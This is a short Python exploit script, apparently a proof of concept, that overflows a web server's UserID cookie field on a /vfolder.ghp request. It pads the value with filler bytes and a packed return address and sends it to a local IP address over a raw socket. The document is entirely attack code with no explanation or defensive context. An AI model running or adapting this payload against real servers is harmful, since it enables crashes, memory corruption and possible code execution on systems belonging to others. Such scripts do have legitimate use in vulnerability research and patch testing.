#!/usr/bin/python

import sys,socket,os,struct

host = '192.168.1.26'
port = 80

payload = ''
payload += 'A' * 20
payload += struct.pack("<I", 0x1001646a)
payload += 'B' * 276

buf = (
	"GET /vfolder.ghp HTTP/1.1\r\n"
	"User-Agent: Mozilla/4.0\r\n"
	"Host:" + host + ":" + str(port) + "\r\n"
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
	"Accept-Language: en-us\r\n"
	"Accept-Encoding: gzip, deflate\r\n"
	"Referer: http://" + host + "/\r\n"
	"Cookie: SESSIONID=6771; UserID=" + payload + "; PassWD=;\r\n"
	"Conection: Keep-Alive\r\n\r\n"
	)
	
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host,port))
sock.send(buf)
sock.close()